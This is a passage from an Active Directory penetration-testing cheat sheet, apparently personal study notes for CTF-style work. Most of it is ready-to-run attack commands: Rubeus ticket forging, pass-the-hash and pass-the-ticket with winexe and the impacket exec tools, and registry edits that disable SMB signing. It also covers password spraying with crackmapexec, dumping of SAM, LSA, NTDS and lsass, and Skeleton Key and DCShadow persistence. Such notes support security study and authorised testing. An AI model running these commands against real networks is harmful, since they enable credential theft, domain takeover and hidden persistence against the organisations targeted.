								Rubeus.exe asktgt /domain:domain_name.local /user:any_name /rc4:NTLM_hash /createnetonly:C:\temp\shell.exe => Runs a new process and Performs PTT (ie, passes ticket to it)
								Flags:
									/domain =>
									/user =>
									/password => password
									/certificate cert.pfx => Using a PCKS12 Certificate instead of pass or hash
									/enctype <hash_type> => used when passing a hash. Values: DES|RC4|AES128|AES256
									/rc4 => NTLM Hash
									/des => DES Hash
									/aes128 => AES128 Hash
									/aes256 => AES256 Hash
									/ptt => passes the ticket to current session
									/createnetonly:shell.exe => start a new process and pass ticket to it
									/outfile
									/luid
									/nowrap
									/opsec
						ASKTGS:
							Basics:
								Request a service ticket using the passed TGT
							Usage:
								Rubeus.exe asktgs /ticket:file.kirbi /service:SPN1 [/enctype:DES|RC4|AES128|AES256] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] [/enterprise] [/opsec] </tgs:BASE64 | /tgs:FILE.KIRBI> [/targetdomain] [/u2u] [/targetuser] [/servicekey:PASSWORDHASH] [/asrepkey:ASREPKEY]
								Flags:
									/ticket file.kirbi
									/service:<spn>
									/service:<spn1,spn2>
						GOLDEN:
							Basics:
								Golden Ticket
							Usage:
								Rubeus.exe golden </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> /ldap [/printcmd] [outfile:FILENAME] [/ptt]
								Flags:
						SILVER:
							Basics:
								Silver Ticket
							Usage:
								Flags:
						RENEW:
							Basics:
								Renew (or autorenew) a TGT or service ticket
							Usage:
								Flags:
						BRUTE:
							Basics:
							Usage:
								Flags:
						PURGE:
							Basics:
								Purge tickets from the current logon sessio
						Describe:
							Basics:
								Parse and describe a ticket (service ticket or TGT)
						S4U:
							Basics:
								Perform S4U2self and S4U2proxy actions
							Usage:
								Flags:
						ASREPROAST:
							Basics:
							Usage:
								Rubeus.exe asreproast /outfile:hashes.txt /format:hashcat
								Flags:
									/outfile =>
									/format =>
						KERBEROAST:
							Basics:
							Usage:
								Rubeus.exe Kerberoast /outfile:hash.txt
								Flags:
									/outfile => output.txt
						TRIAGE:
							Basics:
							Usage:
								Flags:
						KLIST:
							Basics:
							Usage:
								Flags:
						DUMP:
							Basics:
							Usage:
								Flags:
						TGTDELEG:
							Basics:
							Usage:
								Flags:
						MONITOR:
							Basics:
							Usage:
								Flags:
						HARVEST:
							Basics:
							Usage:
								Flags:
						CREATENETONLY:
							Basics:
							Usage:
								Flags:
						HASH:
							Basics:
							Usage:
								Flags:
						TGSSUB:
							Basics:
							Usage:
								Flags:
						CURRENTLUID:
							Basics:
							Usage:
								Flags:
			Once we have Credentials:
				Is it NTLM Hash:
					A. Do PTH
					B. Crack it to get Cleartext Password and Do PTP:
						Cracking NTLM Hash:
							https://samsclass.info/123/proj10/px16-hashcat-win.htm
							hashcat -m 1000 -a 0 -o out.txt hashes.txt wordlist.txt
				Is it Cleartext Password:
					Do PTP
Lateral Movement:
	Pass The Password:(PTP)
		Basics:
		Exploitation:
			Using winexe:
				winexe -U 'domain/user%pass' //ip 'cmd.exe /c command'
				winexe -U 'admin%pass' //ip 'cmd.exe /c command' => runs command as admin
				winexe -U 'admin%pass' --system //ip 'cmd.exe /c command' => runs command as system
				winexe -U 'admin%pass' //ip cmd.exe => gives shell as admin
				winexe -U 'user%pass' //ip cmd.exe => gives shell as user
				Flags:
					-U =>
					--system =>
			Note:
				Also, Read RCE tools explained below.
	Pass The Hash:(PTH)
		Basics:
		Exploitation:
			PTH over CLI:
				Using pth-toolkit:(https://github.com/byt3bl33d3r/pth-toolkit.git)
					pth-winexe:(most used)
						pth-winexe -U user%hash //ip cmd.exe
				Note:
					Also, Read RCE tools explained below.
			PTH over RDP:
				Using xFreeRDP:
					xfreerdp /u:<user_name> /d:<domain_name> /pth:<hash> /v:<ip>
					Note:
						Read Active Information Gathering for more.
			Note:
				Sometimes, when we try to PTH from users who are a part of admin group, but are not administrators, then we get a error "Access Denied", in such case, we need to make the following to the registry:
					Using CMD:
						1. reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
						2. reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanmanServer\Parameters" /v RequireSecuritySignature /t REG_DWORD /d 0 /f
					Using PS:
						1. Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LocalAccountTokenFilterPolicy -Value 1 -Type DWord
						2. Set-ItemProperty -Path HKLM:\System\CurrentControlSet\Services\LanmanServer\Parameters -Name RequireSecuritySignature -Value 0 -Type DWord
				This will let us PTH from users who are a part of admin group too.
		Note:	
			We pass Hash in form of NT:LM
	PTK:(Pass The Key)
		Basics:
			PTK means Passing The kerberos Key(Ticket)
			This is useful in networks where NTLM authenciation protocol is disabled
		Exploitation:
			Psexec.py:
				export KRB5CCNAME=ticket.kirbi(or ticket.ccache)
				psexec.py domain/username@hostIP -dc-ip <ip> -k -no-pass
	Tools for Remote Execution:(Can be used for PTP/PTH)
		psexec.py:
			Basics:
				psexec.py requires creds of a user having local admin or higher privileges because it requires read/write access to ADMIN$ share as it uploads a service binary (RemComSvc utility) with an arbitrary name to give shell
				Uses port TCP/445
				Working:
					1. Copy a service binary to the ADMIN$ share over SMB
					2. Create a service on the remote machine pointing to the binary
					3. Remotely start the service
					4. When exited, stop the service and delete the binary
				Note:
					Psexec.py gets detected easily and is often caught by the defender
			Usage:
				psexec.py user:password@192.168.1.2
				psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c user@192.168.1.2 cmd.exe
				psexec.py domain/username:password@hostIP
				Meta-Commands:
					get => to download
					put => to upload
				Flags:
					-dc-ip => IP of Domain Controller
					-hashes => use Hash
					-k => use TGT
					-no-pass => do not ask for password
		smbexec.py:
			Basics:
				Smbexec.py creates a batch file for each command that you run, then creates a service to run the file using cmd.exe, instead of uploading an executable(like psexec.py)
				Uses port TCP/445
				This script works in two ways:
					share mode: 
						we specify a share, and everything is done through that share.
					server mode:(by default)
						if for any reason there’s no share available, this script will launch a local SMB server, so the output (both STDOUT and STDERR) of the commands executed is sent back by the target machine into a locally shared folder. To use this mode, we need to run this script with SUDO privileges as it needs to open the local port 445 on kali.
				This generates a lot of windows event logs since you’re creating and deleting a lot of services, but it still tends to be detected less frequently than psexec.py.
				Unlike Psexec.py, smbexec.py does not have 'get' and 'put' commands.
				Since it’s not an interactive shell, it’s important to be careful what commands you run and how you run them. If you have to run PowerShell commands then you should build one-liners, otherwise smbexec.py will hang.
			Usage:
				smbexec.py domain/username:password@hostIP
		atexec.py:
			Basics:
				atexec.py uses the Task Scheduler service (Atsvc) on the remote Windows system to execute a supplied command.
				Uses port TCP/445
				atexec.py dont gives a shell, instead, it allows you to execute some command or one-liner as the NT Authority\System user, and then sends the output back to you.
			Usage:
				atexec.py domain/username:password@hostIP command
				atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 "Administrator"@192.168.204.183 "whoami"
				atexec.py "Administrator:pass123"@192.168.204.183 "whoami"
				Flags:
					-hashes => 
		wmiexec.py:
			Basics:
				wmiexec.py uses the WMI and DCOM to create a windows process to run commands and it writes the output out to a temp file in an SMB share ( ADMIN$ by default) and then retrieves the output and deletes the file.
				Uses port TCP/135, TCP/445, TCP/50911(winmgmt)
				Wmiexec.py dont get detected easily since it dont generate a lot of windows event logs about services being created.
				Like psexec.py, wmiexec.py supports the put and get commands to upload and download files
			Usage:
				wmiexec.py domain/username:password@hostIP
		dcomexec.py:
			Basics:
				dcomexec.py uses various DCOM endpoints such as MMC20.Application, ShellWindows or ShellBrowserWindow objects to spawn a semi-interactive shell on target system.
				Uses port TCP/135, TCP/445, TCP/49751(DCOM)
			Usage:
				dcomexec.py "Administrator:pass123"@192.168.204.183
				dcomexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 "Administrator"@192.168.204.183
				Flags:
					-hashes => 
Post Exploitation:
	Persistence:
		DCShadow:
			DCShadow allows an attacker with enough privileges to create a rogue Domain Controller and push malicious changes to AD
			Requirements:
				Two shells are required:
					one running with SYSTEM privileges
					one running with privileges of a domain member that is in Domain admins group
			Exploitation:
				https://attack.stealthbits.com/how-dcshadow-persistence-attack-works
				https://pentestlab.blog/2018/04/16/dcshadow/
				Set-DCShadowPermissions.ps1:(https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1)
		Skeleton Key:
			Basics:	
				In-depth explanation => https://www.secureworks.com/research/skeleton-key-malware-analysis
				General Meaning:
					A skeleton key is a type of master key in which the serrated edge has been removed in such a way that it can open numerous locks. (wikipedia)
				Meaning wrt AD:
					Skeleton Key is a malware that injects itself into LSASS(memory) and creates a master password that will work for any account in the domain. Existing passwords will also continue to work, so it is very difficult to know this attack has taken place.
				Requirements:
					1. Attacker must have Domain Admin rights
					2. This attack must be performed on each and every domain controller for complete compromise, but even targeting a single domain controller can be effective.
					3. This attack can only be exploited on 64bit domain controller.(https://adsecurity.org/?p=1255)
					4. Works on only > Windows server 2012.(https://adsecurity.org/?p=1255)
				Note:
					Rebooting a domain controller will remove this malware and it will have to be redeployed by the attacker.
			Exploitation:
				Mimikitaz:
					misc::skeleton => after this we can use default mimikitaz creds(jeff:mimikitaz) for everything/every user
				Note:
					its possible that target has patched skeleton key vulnerability.
Password Spraying:
	Crackmapexec:(Most efficient and feature rich tool for password spraying)
		Basics:
			Usage:
				password spraying
				To confirm passwords/hashes/kerberos
				RCE
				dump sam/lsa/ntds
				enumerate stuff like password-policy/users
			Protocols Supported:
				LDAP
				SSH
				SMB
				WINRM
				MSSQL
		Usage:
			Password Spraying:
				crackmapexec smb ip -u user.txt -p 'password' --continue-on-success
				crackmapexec smb ip -u username -p pass.txt --continue-on-success
				crackmapexec smb ip -u user.txt -p pass.txt --continue-on-success
				crackmapexec smb ip -u user.txt -H hash.txt --continue-on-success => using hashes instead of passwords
				crackmapexec smb targets.txt -u user.txt -p pass.txt --continue-on-success
			Password Spraying without bruteforce:
				Can be used with winrm and mssql protocol only.
				crackmapexec winrm targets.txt -u user.txt -p pass.txt --no-bruteforce --continue-on-success
			To check the password/hash:
				crackmapexec smb domain.local -u 'username' -p 'pass' #ptp
				crackmapexec smb domain.local -u 'username' -H hash #pth
			To check the Kerberos ticket:
				We can use kerberos ticket instead of pass to authenciate here
				export KRB5CCNAME=~/Desktop/administrator.ccache 
				cme smb domain.local --kerberos
				Note:
					we dont use username here.
			Once we have valid credentials or kerberos ticket:
				Downloading Files:
					crackmapexec smb ip -u 'username' -p 'pass' --get-file \\temp\\creds.txt creds.txt
				Uploading Files:
					crackmapexec smb ip -u 'username' -p 'pass' --put-file shell.exe \\temp\\shell.exe
				rce:
					crackmapexec smb ip -u 'user' -p 'pass' -x 'command'
					crackmapexec smb ip -u 'user' -p 'pass' -x 'command' --exec-method atexec => executes using atexec
					crackmapexec smb ip -u 'user' -p 'pass' -x 'command' --exec-method wmiexec => executes using wmiexec
					crackmapexec smb ip -u 'user' -p 'pass' -x 'command' --exec-method smbexec => executes using smbexec
				enumeration:
					crackmapexec smb ip -u 'username' -p 'pass' --users => users
					crackmapexec smb ip -u 'username' -p 'pass' --loggedon-users => currently logged on users
					crackmapexec smb ip -u 'username' -p 'pass' --groups => domain groups
					crackmapexec smb ip -u 'username' -p 'pass' --local-group => local groups
					crackmapexec smb ip -u 'username' -p 'pass' --shares => shares
					crackmapexec smb ip -u 'username' -p 'pass' --pass-pol => password policy
					crackmapexec smb ip -u 'username' -p 'pass' --disks => disk drives
				Dumping Password files:
					crackmapexec smb ip -u 'username' -p 'pass' --sam => sam file
					crackmapexec smb ip -u 'username' -p 'pass' --lsa => lsa file(LSA => Local Security Authority)
					crackmapexec smb ip -u 'username' -p 'pass' --ntds drsuapi => dump ntds.dit using drsuapi method
					crackmapexec smb ip -u 'username' -p 'pass' --ntds vss => dumps ntds.dit using vss method
				Modules:
					crackmapexec mssql -L => List all modules for mssql protocol method
						Get-ComputerDetails => Enumerates sysinfo
						mimikatz => Dumps all logon credentials from memory
						mimikittenz => Executes Mimikittenz
						pe_inject => Downloads the specified DLL/EXE and injects it into memory
						tokens => Enumerates available tokens
					crackmapexec smb -L => List all modules for smb protocol method
						Get-ComputerDetails => Enumerates sysinfo
						bh_owned => Set pwned computer as owned in Bloodhound
						bloodhound => Executes the BloodHound recon script on the target and retreives the results to the attackers' machine
						lsassy => Dump lsass and parse the result remotely with lsassy
						mimikatz => Dumps all logon credentials from memory
						mimikittenz => Executes Mimikittenz
						pe_inject => Downloads the specified DLL/EXE and injects it into memory
						rdp => Enables/Disables RDP
						tokens => Enumerates available tokens
						uac => Checks UAC status
					crackmapexec smb -M <module_name> --options => see options for the sepcific module
					crackmapexec smb ip -u 'user' -p 'pass' -M module_name -o <option='value'>
						Flags:
							-o => passing aguments to module. Its specified in form of KEY=value
					Modules Explained:
						lsassy:(to dump lsass)
							crackmapexec smb 192.168.255.131 -u administrator -p pass -M lsassy -o REMOTE_LSASS_DUMP=LSASSY_DUMP.dmp
							Note:
								to read more about lsassy, read under "credential mining" section
						mimikatz:(allows to use mimikatz)
							crackmapexec smb ip -u 'user' -p 'pass' -M mimikatz -o COMMAND='privilege::debug'
							Note:
								to read more about mimkatz, read under "credential mining" section
			Note:
				crackmapexec allows ipv6:
					dont use ip, instead use domain_name
	kerbrute:
		kerbrute passwordspray --dc ip -d domain.local -t 200 user.txt password1234 => password spraying
		Note:
			to read more about kerbrute => Read Kerbrute section above
	hydra:
		Hydra can be used to password spray as bruteforcing and password spray go hand in 
		hydra -L users -P wordlist ip smb
		Note:
			To read more about this tool, Read Password Cracking Sheet
	Note:
		Lets say we have 100 users and we have found password for one user via some attack(example as-reproast,etc), then use that password against via every user:
			crackmapexec smb ip -u user.txt -p 'password' --continue-on-success
	Note:
		In case of CTF, when we do password spray with a password list and we have a web_port open, then, we should create a password list by using cewl:
			cewl -d 7 -m <min_length> --with-numbers -w pass.txt http://xxxx/index.html
			Note:
				For more info about cewl tool, Read Password Cracking sheet
	Note:
		To get users list:
			Creating a wordlist of possible users:
				From ldap/rpc/etc
				From website with employee list:
					Example:
						Frank Smith:
							FrankSmith
							Franksmith
							franksmith
							fsmith
							FSMITH
							F.smith
							f.smith
							franks
							FRANKS
							frank.s
							Frank.s
							frank.S
			Pre-built users.txt:
				/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
			Verifying which of them are VALID users:
				kerbrute userenum
Methodology Map:
	Part-1: Gaining Initial Shell:
		Way-1: Grab Net-NTLM hash via NTLM Attacks:
			A. Crack it to gain password
			B. Relay it to gain shell
		Way-2:
			Step-1: Finding users to create users.list:
				Step-1: Finding possible users:
					A. Find list of users by enumerating open ports(ldap/rpc/smb/http/etc)
					B. Pre-built userlists
				Step-2: Verfiying those users:
					A. kerbrute userenum
			Step-2: Grabbing Password/Hash:
				A. AS-REPRoast
				B. Password Spray
			Step-3: Once we have the Password/Hash:
				A. Repeat step-1 but use known creds to authenticate services for better output
				B. Enumeration:
					1. Using Bloodhound Remotely:
						A. Bloodhound-python
						B. crackmapexec smb ip -u 'username' -p 'password' -M bloodhound
					2. GetADUsers.py
				C. Kerberoasting
				D. Password Spraying
				E. crackmapexec smb ip -u 'username' -p 'password' -M mimikatz -o COMMAND='any_command_we_wanna_run'
				F. Gaining Shell:
					A. winrm
					B. PTH
					C. PTP
	Part-2: Escalating Privilege:
		A. Enumeration:
			A. Manual Enumeration
			B. Automated Enumeration:
				powerview.ps1
				Bloodhound
			C. Credential Mining
		B. Exploitation:
			A. Golden Ticket Attack
				Needs KRBTGT NTLM Hash and provides privileges of any user.
			B. PTT
				We extract TGT from memory and use that TGT to impersonate it's priveleges.
			C. OPTH
			D. Silver Ticket(Very Rare)
		Note:
			Every attack/enumeration vector has its own requirements, some work only when we have a shell and some require just creds and some require both creds and a shell.
	Part-3: Lateral Movement:
		A. PTP
		B. PTH
		C. PTK
		D. PTC
			Relay kerberos ccache file of some user to other systems in an AD to gain shell with same privileges
	Part-4 Peristence:
		A. DCShadow
		B. Skeleton Key
	Note:
		For IPv6:
	Note:
		Only AD Related vectors are contained in this Methodology Map.